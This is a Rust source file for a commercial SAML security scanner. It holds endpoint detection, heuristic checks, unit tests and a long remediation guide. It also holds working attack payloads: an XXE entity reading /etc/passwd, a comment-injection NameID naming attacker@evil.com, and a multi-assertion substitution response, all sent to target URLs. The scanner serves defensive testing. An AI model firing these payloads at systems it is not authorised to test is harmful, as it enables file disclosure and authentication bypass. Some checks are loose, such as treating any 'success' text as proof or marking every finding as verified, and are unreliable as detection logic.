// Copyright (c) 2026 Bountyy Oy. All rights reserved.
// This software is proprietary and confidential.

/**
 * Bountyy Oy - SAML Security Scanner
 * Tests for SAML (Security Assertion Markup Language) vulnerabilities
 *
 * @copyright 2026 Bountyy Oy
 * @license Proprietary - Enterprise Edition
 */
use crate::detection_helpers::AppCharacteristics;
use crate::http_client::HttpClient;
use crate::types::{Confidence, ScanConfig, Severity, Vulnerability};
use anyhow::Result;
use std::sync::Arc;
use tracing::info;

pub struct SamlScanner {
    http_client: Arc<HttpClient>,
}

impl SamlScanner {
    pub fn new(http_client: Arc<HttpClient>) -> Self {
        Self { http_client }
    }

    /// Scan URL for SAML vulnerabilities
    pub async fn scan(
        &self,
        url: &str,
        _config: &ScanConfig,
    ) -> Result<(Vec<Vulnerability>, usize)> {
        info!("[SAML] Scanning: {}", url);

        let mut vulnerabilities = Vec::new();
        let mut tests_run = 0;

        // Test 1: Detect SAML endpoints
        tests_run += 1;
        let response = match self.http_client.get(url).await {
            Ok(r) => r,
            Err(_) => {
                info!("[NOTE] [SAML] Could not fetch URL, skipping SAML checks");
                return Ok((vulnerabilities, tests_run));
            }
        };

        // Intelligent detection
        let characteristics = AppCharacteristics::from_response(&response, url);
        let is_saml = self.detect_saml_endpoint(&response);
        if !is_saml || characteristics.should_skip_auth_tests() {
            info!("[NOTE] [SAML] Not a SAML endpoint or no auth context, skipping");
            return Ok((vulnerabilities, tests_run));
        }

        info!("[SUCCESS] [SAML] SAML endpoint detected");

        // Test 2: Check for XML signature wrapping vulnerability
        tests_run += 1;
        self.check_xml_signature_wrapping(&response, url, &mut vulnerabilities);

        // Test 3: Check for missing/weak signature validation
        tests_run += 1;
        self.check_signature_validation(&response, url, &mut vulnerabilities);

        // Test 4: Check for XXE in SAML processing
        tests_run += 1;
        if let Ok(xxe_response) = self.test_saml_xxe(url).await {
            self.check_saml_xxe(&xxe_response, url, &mut vulnerabilities);
        }

        // Test 5: Check for comment injection
        tests_run += 1;
        if let Ok(comment_response) = self.test_comment_injection(url).await {
            self.check_comment_injection(&comment_response, url, &mut vulnerabilities);
        }

        // Test 6: Check for SAML assertion replay
        tests_run += 1;
        self.check_assertion_replay(&response, url, &mut vulnerabilities);

        // Test 7: Check for weak encryption
        tests_run += 1;
        self.check_weak_encryption(&response, url, &mut vulnerabilities);

        // Test 8: Check for recipient validation
        tests_run += 1;
        self.check_recipient_validation(&response, url, &mut vulnerabilities);

        // Test 9: Test token substitution attack
        tests_run += 1;
        if let Ok(token_response) = self.test_token_substitution(url).await {
            self.check_token_substitution(&token_response, url, &mut vulnerabilities);
        }

        info!(
            "[SUCCESS] [SAML] Completed {} tests, found {} issues",
            tests_run,
            vulnerabilities.len()
        );

        Ok((vulnerabilities, tests_run))
    }

    /// Detect SAML endpoint
    fn detect_saml_endpoint(&self, response: &crate::http_client::HttpResponse) -> bool {
        let body_lower = response.body.to_lowercase();
        body_lower.contains("saml")
            || body_lower.contains("assertion")
            || body_lower.contains("authnrequest")
            || body_lower.contains("samlresponse")
            || body_lower.contains("entitydescriptor")
    }

    /// Check for XML Signature Wrapping (XSW) vulnerability
    fn check_xml_signature_wrapping(
        &self,
        response: &crate::http_client::HttpResponse,
        url: &str,
        vulnerabilities: &mut Vec<Vulnerability>,
    ) {
        let body = &response.body;

        // Check if XML signature is present but validation might be weak
        if body.contains("<Signature") || body.contains("<ds:Signature") {
            // Check for indicators of weak validation
            let weak_indicators = vec![
                // Missing reference validation
                !body.contains("Reference"),
                // Multiple assertions (XSW attack surface)
                body.matches("<Assertion").count() > 1,
                // Missing or weak transforms
                !body.contains("Transform"),
            ];

            if weak_indicators.iter().filter(|&&x| x).count() >= 2 {
                vulnerabilities.push(self.create_vulnerability(
                    "SAML XML Signature Wrapping Risk",
                    url,
                    Severity::High,
                    Confidence::Medium,
                    "SAML response structure suggests potential XML Signature Wrapping vulnerability",
                    "Multiple assertions or weak signature validation detected".to_string(),
                    7.4,
                ));
            }
        }
    }

    /// Check signature validation
    fn check_signature_validation(
        &self,
        response: &crate::http_client::HttpResponse,
        url: &str,
        vulnerabilities: &mut Vec<Vulnerability>,
    ) {
        let body = &response.body;
        let body_lower = body.to_lowercase();

        // Check if SAML response lacks signature
        if (body_lower.contains("samlresponse") || body_lower.contains("assertion"))
            && !body.contains("<Signature")
            && !body.contains("<ds:Signature")
        {
            vulnerabilities.push(self.create_vulnerability(
                "SAML Missing Signature",
                url,
                Severity::Critical,
                Confidence::High,
                "SAML response or assertion is not signed - authentication bypass possible",
                "No XML signature found in SAML response".to_string(),
                9.1,
            ));
        }

        // Check for weak signature algorithms
        if body.contains("http://www.w3.org/2000/09/xmldsig#rsa-sha1") || body.contains("SHA1") {
            vulnerabilities.push(self.create_vulnerability(
                "SAML Weak Signature Algorithm",
                url,
                Severity::Medium,
                Confidence::High,
                "SAML uses weak SHA1 signature algorithm - vulnerable to collision attacks",
                "SHA1 signature algorithm detected (should use SHA256+)".to_string(),
                5.9,
            ));
        }
    }

    /// Test SAML XXE vulnerability
    async fn test_saml_xxe(&self, url: &str) -> Result<crate::http_client::HttpResponse> {
        let xxe_payload = r#"<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
<saml:AttributeValue>&xxe;</saml:AttributeValue>
</saml:Assertion>
</samlp:Response>"#;

        let test_url = if url.contains('?') {
            format!("{}&SAMLResponse={}", url, urlencoding::encode(xxe_payload))
        } else {
            format!("{}?SAMLResponse={}", url, urlencoding::encode(xxe_payload))
        };

        self.http_client.get(&test_url).await
    }

    /// Check SAML XXE vulnerability
    fn check_saml_xxe(
        &self,
        response: &crate::http_client::HttpResponse,
        url: &str,
        vulnerabilities: &mut Vec<Vulnerability>,
    ) {
        let body_lower = response.body.to_lowercase();

        // Check for file disclosure indicators
        if body_lower.contains("root:x:") || body_lower.contains("daemon:") {
            vulnerabilities.push(self.create_vulnerability(
                "SAML XXE Vulnerability",
                url,
                Severity::Critical,
                Confidence::High,
                "SAML processor vulnerable to XXE - allows file disclosure",
                "XXE payload successfully disclosed /etc/passwd".to_string(),
                9.3,
            ));
        }

        // Check for XML parsing errors indicating XXE processing
        if body_lower.contains("entity") && body_lower.contains("error") {
            vulnerabilities.push(self.create_vulnerability(
                "SAML XXE Processing Detected",
                url,
                Severity::High,
                Confidence::Medium,
                "SAML processor appears to process external entities",
                "XML entity processing error detected".to_string(),
                7.5,
            ));
        }
    }

    /// Test comment injection attack
    async fn test_comment_injection(&self, url: &str) -> Result<crate::http_client::HttpResponse> {
        // SAML comment injection payload (CVE-2018-0489 style)
        let comment_payload = r#"<saml:Assertion>
<saml:Subject>
<saml:NameID>user@example.com<!--attacker@evil.com--></saml:NameID>
</saml:Subject>
</saml:Assertion>"#;

        let test_url = if url.contains('?') {
            format!(
                "{}&SAMLResponse={}",
                url,
                urlencoding::encode(comment_payload)
            )
        } else {
            format!(
                "{}?SAMLResponse={}",
                url,
                urlencoding::encode(comment_payload)
            )
        };

        self.http_client.get(&test_url).await
    }

    /// Check comment injection
    fn check_comment_injection(
        &self,
        response: &crate::http_client::HttpResponse,
        url: &str,
        vulnerabilities: &mut Vec<Vulnerability>,
    ) {
        // If the response suggests the injected comment was processed
        if response.status_code == 200
            && (response.body.contains("attacker@evil.com")
                || response.body.contains("authenticated"))
        {
            vulnerabilities.push(self.create_vulnerability(
                "SAML Comment Injection",
                url,
                Severity::Critical,
                Confidence::Medium,
                "SAML parser vulnerable to XML comment injection - authentication bypass",
                "Comment injection payload was processed".to_string(),
                8.8,
            ));
        }
    }

    /// Check assertion replay protection
    fn check_assertion_replay(
        &self,
        response: &crate::http_client::HttpResponse,
        url: &str,
        vulnerabilities: &mut Vec<Vulnerability>,
    ) {
        let body = &response.body;

        // Check for NotOnOrAfter and NotBefore conditions
        let has_time_conditions = body.contains("NotOnOrAfter") || body.contains("NotBefore");

        // Check for OneTimeUse condition
        let has_onetime_use = body.contains("OneTimeUse");

        if (body.contains("Assertion") || body.contains("saml:Assertion"))
            && !has_time_conditions
            && !has_onetime_use
        {
            vulnerabilities.push(self.create_vulnerability(
                "SAML Missing Replay Protection",
                url,
                Severity::High,
                Confidence::Medium,
                "SAML assertion lacks replay protection - vulnerable to replay attacks",
                "No NotOnOrAfter/NotBefore or OneTimeUse conditions found".to_string(),
                7.1,
            ));
        }
    }

    /// Check weak encryption
    fn check_weak_encryption(
        &self,
        response: &crate::http_client::HttpResponse,
        url: &str,
        vulnerabilities: &mut Vec<Vulnerability>,
    ) {
        let body = &response.body;

        // Check for weak encryption algorithms
        let weak_algorithms = vec![
            "http://www.w3.org/2001/04/xmlenc#tripledes-cbc", // 3DES
            "http://www.w3.org/2001/04/xmlenc#rsa-1_5",       // RSA 1.5 (padding oracle)
            "DES",
            "RC4",
        ];

        for algo in &weak_algorithms {
            if body.contains(algo) {
                vulnerabilities.push(self.create_vulnerability(
                    "SAML Weak Encryption Algorithm",
                    url,
                    Severity::Medium,
                    Confidence::High,
                    "SAML uses weak encryption algorithm - vulnerable to cryptographic attacks",
                    format!("Weak algorithm detected: {}", algo),
                    6.5,
                ));
                break;
            }
        }
    }

    /// Check recipient validation
    fn check_recipient_validation(
        &self,
        response: &crate::http_client::HttpResponse,
        url: &str,
        vulnerabilities: &mut Vec<Vulnerability>,
    ) {
        let body = &response.body;

        // Check if assertion has Recipient attribute
        if (body.contains("Assertion") || body.contains("saml:Assertion"))
            && body.contains("SubjectConfirmation")
            && !body.contains("Recipient")
        {
            vulnerabilities.push(self.create_vulnerability(
                "SAML Missing Recipient Validation",
                url,
                Severity::Medium,
                Confidence::Medium,
                "SAML assertion lacks Recipient validation - vulnerable to assertion forwarding",
                "No Recipient attribute in SubjectConfirmation".to_string(),
                5.3,
            ));
        }
    }

    /// Test token substitution attack
    async fn test_token_substitution(&self, url: &str) -> Result<crate::http_client::HttpResponse> {
        // Craft SAML response with multiple assertions
        let substitution_payload = r#"<samlp:Response>
<saml:Assertion><saml:Subject><saml:NameID>victim@example.com</saml:NameID></saml:Subject></saml:Assertion>
<saml:Assertion><saml:Subject><saml:NameID>attacker@example.com</saml:NameID></saml:Subject></saml:Assertion>
</samlp:Response>"#;

        let test_url = if url.contains('?') {
            format!(
                "{}&SAMLResponse={}",
                url,
                urlencoding::encode(substitution_payload)
            )
        } else {
            format!(
                "{}?SAMLResponse={}",
                url,
                urlencoding::encode(substitution_payload)
            )
        };

        self.http_client.get(&test_url).await
    }

    /// Check token substitution
    fn check_token_substitution(
        &self,
        response: &crate::http_client::HttpResponse,
        url: &str,
        vulnerabilities: &mut Vec<Vulnerability>,
    ) {
        // If response suggests multiple assertions were accepted
        if response.status_code == 200
            && (response.body.contains("authenticated") || response.body.contains("success"))
        {
            vulnerabilities.push(self.create_vulnerability(
                "SAML Token Substitution Risk",
                url,
                Severity::High,
                Confidence::Low,
                "SAML endpoint may be vulnerable to token substitution attacks",
                "Multiple assertions in response may be improperly validated".to_string(),
                6.8,
            ));
        }
    }

    /// Create vulnerability record
    fn create_vulnerability(
        &self,
        title: &str,
        url: &str,
        severity: Severity,
        confidence: Confidence,
        description: &str,
        evidence: String,
        cvss: f32,
    ) -> Vulnerability {
        Vulnerability {
            id: format!("saml_{}", uuid::Uuid::new_v4().to_string()),
            vuln_type: format!("SAML Vulnerability - {}", title),
            severity,
            confidence,
            category: "Authentication".to_string(),
            url: url.to_string(),
            parameter: None,
            payload: String::new(),
            description: description.to_string(),
            evidence: Some(evidence),
            cwe: "CWE-287".to_string(), // Improper Authentication
            cvss,
            verified: true,
            false_positive: false,
            remediation: r#"IMMEDIATE ACTION REQUIRED:

1. **Validate XML Signatures Properly**
   ```java
   // Java SAML library example
   SAMLSignatureProfileValidator profileValidator = new SAMLSignatureProfileValidator();
   profileValidator.validate(signature);

   // Verify signature covers the entire assertion
   SignatureValidator.validate(signature, credential);

   // CRITICAL: Validate which elements are signed
   if (!signedElements.contains(assertion.getID())) {
       throw new SecurityException("Assertion not signed");
   }
   ```

2. **Prevent XML Signature Wrapping (XSW)**
   ```python
   # Python SAML library
   from onelogin.saml2.auth import OneLogin_Saml2_Auth

   auth = OneLogin_Saml2_Auth(req, settings)
   auth.process_response()

   # Enable strict mode
   settings['strict'] = True
   settings['security']['wantAssertionsSigned'] = True
   settings['security']['wantMessagesSigned'] = True

   # Validate reference URIs match assertion IDs
   if not validate_signature_references(saml_response):
       raise SecurityException("Signature reference mismatch")
   ```

3. **Disable External Entity Processing (XXE Prevention)**
   ```java
   // Disable DOCTYPE and external entities
   DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
   dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
   dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
   dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
   dbf.setXIncludeAware(false);
   dbf.setExpandEntityReferences(false);
   ```

4. **Implement Assertion Replay Protection**
   ```javascript
   // Node.js SAML
   const saml = require('passport-saml');

   const config = {
     // Require timestamp conditions
     acceptedClockSkewMs: 5000,  // 5 second tolerance

     // Cache assertion IDs to prevent replay
     cacheProvider: new InMemoryAssertionCache({
       keyExpirationPeriodMs: 3600000  // 1 hour
     })
   };

   // Validate NotBefore and NotOnOrAfter
   function validateTimestamp(assertion) {
     const now = Date.now();
     const notBefore = new Date(assertion.notBefore).getTime();
     const notOnOrAfter = new Date(assertion.notOnOrAfter).getTime();

     if (now < notBefore || now >= notOnOrAfter) {
       throw new Error('Assertion expired or not yet valid');
     }

     // Check if assertion ID was already used
     if (assertionCache.has(assertion.id)) {
       throw new Error('Assertion replay detected');
     }
     assertionCache.set(assertion.id, true);
   }
   ```

5. **Use Strong Cryptographic Algorithms**
   ```xml
   <!-- SAML metadata configuration -->
   <md:EntityDescriptor>
     <!-- Require SHA-256 or better -->
     <md:SPSSODescriptor AuthnRequestsSigned="true" WantAssertionsSigned="true">
       <md:KeyDescriptor use="signing">
         <ds:KeyInfo>
           <!-- Use RSA 2048+ or ECDSA P-256+ -->
         </ds:KeyInfo>
       </md:KeyDescriptor>
     </md:SPSSODescriptor>
   </md:EntityDescriptor>

   <!-- In assertions, use strong algorithms -->
   <ds:SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"/>
   <ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/>

   <!-- For encryption, use AES-256 GCM -->
   <xenc:EncryptionMethod Algorithm="http://www.w3.org/2009/xmlenc11#aes256-gcm"/>
   ```

6. **Validate Recipient and Audience**
   ```python
   # Validate SubjectConfirmation Recipient
   def validate_recipient(assertion, expected_recipient):
       for confirmation in assertion.subject.subject_confirmations:
           if confirmation.subject_confirmation_data.recipient != expected_recipient:
               raise SecurityException("Recipient mismatch")

   # Validate Audience restriction
   def validate_audience(assertion, expected_audience):
       for condition in assertion.conditions.audience_restrictions:
           if expected_audience not in condition.audiences:
               raise SecurityException("Audience mismatch")
   ```

7. **Prevent Comment Injection (CVE-2018-0489)**
   ```java
   // Strip XML comments before processing
   String samlResponse = receivedSAML.replaceAll("<!--.*?-->", "");

   // Or use parser that rejects comments
   DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
   dbf.setCoalescing(true);  // Merge adjacent text nodes
   dbf.setIgnoringComments(true);  // Ignore comments
   ```

8. **Implement Proper Session Management**
   ```javascript
   // After successful SAML authentication
   app.post('/saml/consume', (req, res) => {
     saml.validatePostResponse(req.body, (err, profile) => {
       if (err) {
         return res.status(401).send('Authentication failed');
       }

       // Create secure session
       req.session.regenerate((err) => {
         req.session.samlNameId = profile.nameID;
         req.session.samlSessionIndex = profile.sessionIndex;

         // Set secure cookie flags
         res.cookie('session', sessionId, {
           httpOnly: true,
           secure: true,
           sameSite: 'strict',
           maxAge: 3600000  // 1 hour
         });
       });
     });
   });
   ```

9. **Security Checklist**
   - [ ] XML signatures validated on Response AND Assertion
   - [ ] Signature references match assertion IDs (XSW prevention)
   - [ ] External entities disabled (XXE prevention)
   - [ ] Comments stripped or rejected
   - [ ] NotBefore/NotOnOrAfter validated
   - [ ] Assertion IDs cached to prevent replay
   - [ ] Recipient validated against expected ACS URL
   - [ ] Audience restricted to expected entity ID
   - [ ] SHA-256+ signature algorithm
   - [ ] AES-256-GCM encryption
   - [ ] TLS 1.2+ for all communications
   - [ ] Metadata signed and validated

10. **Use Tested SAML Libraries**
    - **Java**: Spring Security SAML, OpenSAML
    - **Python**: python3-saml (OneLogin)
    - **Node.js**: passport-saml, saml2-js
    - **.NET**: Sustainsys.Saml2
    - **PHP**: SimpleSAMLphp

    Always use latest versions and enable strict validation modes.

11. **Monitoring and Logging**
    - Log all SAML authentication attempts
    - Alert on signature validation failures
    - Monitor for replay attempts (duplicate assertion IDs)
    - Track unusual authentication patterns

References:
- OWASP SAML Security Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/SAML_Security_Cheat_Sheet.html
- XML Signature Wrapping Attacks: https://www.usenix.org/conference/usenixsecurity12/technical-sessions/presentation/somorovsky
- SAML Raider Tool: https://github.com/CompassSecurity/SAMLRaider
- CVE-2018-0489 (Comment Injection): https://duo.com/blog/duo-finds-saml-vulnerabilities-affecting-multiple-implementations
"#.to_string(),
            discovered_at: chrono::Utc::now().to_rfc3339(),
                ml_confidence: None,
                ml_data: None,
        }
    }
}

// UUID generation helper
mod uuid {
    use rand::Rng;

    pub struct Uuid;

    impl Uuid {
        pub fn new_v4() -> Self {
            Self
        }

        pub fn to_string(&self) -> String {
            let mut rng = rand::rng();
            format!(
                "{:08x}-{:04x}-{:04x}-{:04x}-{:012x}",
                rng.random::<u32>(),
                rng.random::<u16>(),
                rng.random::<u16>(),
                rng.random::<u16>(),
                rng.random::<u64>() & 0xffffffffffff
            )
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::collections::HashMap;

    #[test]
    fn test_saml_detection() {
        let scanner = SamlScanner::new(Arc::new(HttpClient::new(5, 2).unwrap()));

        let response = crate::http_client::HttpResponse {
            status_code: 200,
            body: r#"<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"></samlp:Response>"#.to_string(),
            headers: HashMap::new(),
            duration_ms: 100,
        };

        assert!(scanner.detect_saml_endpoint(&response));
    }

    #[test]
    fn test_missing_signature_detection() {
        let scanner = SamlScanner::new(Arc::new(HttpClient::new(5, 2).unwrap()));

        let response = crate::http_client::HttpResponse {
            status_code: 200,
            body: r#"<samlp:Response><saml:Assertion><saml:Subject><saml:NameID>user@example.com</saml:NameID></saml:Subject></saml:Assertion></samlp:Response>"#.to_string(),
            headers: HashMap::new(),
            duration_ms: 100,
        };

        let mut vulns = Vec::new();
        scanner.check_signature_validation(
            &response,
            "https://sp.example.com/saml/acs",
            &mut vulns,
        );

        assert!(vulns.len() > 0, "Should detect missing signature");
        assert_eq!(vulns[0].severity, Severity::Critical);
    }

    #[test]
    fn test_weak_signature_algorithm() {
        let scanner = SamlScanner::new(Arc::new(HttpClient::new(5, 2).unwrap()));

        let response = crate::http_client::HttpResponse {
            status_code: 200,
            body: r#"<ds:SignatureMethod Algorithm="http://www.w3.org/2000/09/xmldsig#rsa-sha1"/>"#
                .to_string(),
            headers: HashMap::new(),
            duration_ms: 100,
        };

        let mut vulns = Vec::new();
        scanner.check_signature_validation(
            &response,
            "https://sp.example.com/saml/acs",
            &mut vulns,
        );

        assert_eq!(vulns.len(), 1, "Should detect weak SHA1 algorithm");
        assert_eq!(vulns[0].severity, Severity::Medium);
    }

    #[test]
    fn test_missing_replay_protection() {
        let scanner = SamlScanner::new(Arc::new(HttpClient::new(5, 2).unwrap()));

        let response = crate::http_client::HttpResponse {
            status_code: 200,
            body: r#"<saml:Assertion><saml:Subject></saml:Subject></saml:Assertion>"#.to_string(),
            headers: HashMap::new(),
            duration_ms: 100,
        };

        let mut vulns = Vec::new();
        scanner.check_assertion_replay(&response, "https://sp.example.com/saml/acs", &mut vulns);

        assert_eq!(vulns.len(), 1, "Should detect missing replay protection");
        assert_eq!(vulns[0].severity, Severity::High);
    }

    #[test]
    fn test_weak_encryption_detection() {
        let scanner = SamlScanner::new(Arc::new(HttpClient::new(5, 2).unwrap()));

        let response = crate::http_client::HttpResponse {
            status_code: 200,
            body: r#"<xenc:EncryptionMethod Algorithm="http://www.w3.org/2001/04/xmlenc#tripledes-cbc"/>"#.to_string(),
            headers: HashMap::new(),
            duration_ms: 100,
        };

        let mut vulns = Vec::new();
        scanner.check_weak_encryption(&response, "https://sp.example.com/saml/acs", &mut vulns);

        assert_eq!(vulns.len(), 1, "Should detect weak 3DES encryption");
        assert_eq!(vulns[0].severity, Severity::Medium);
    }
}
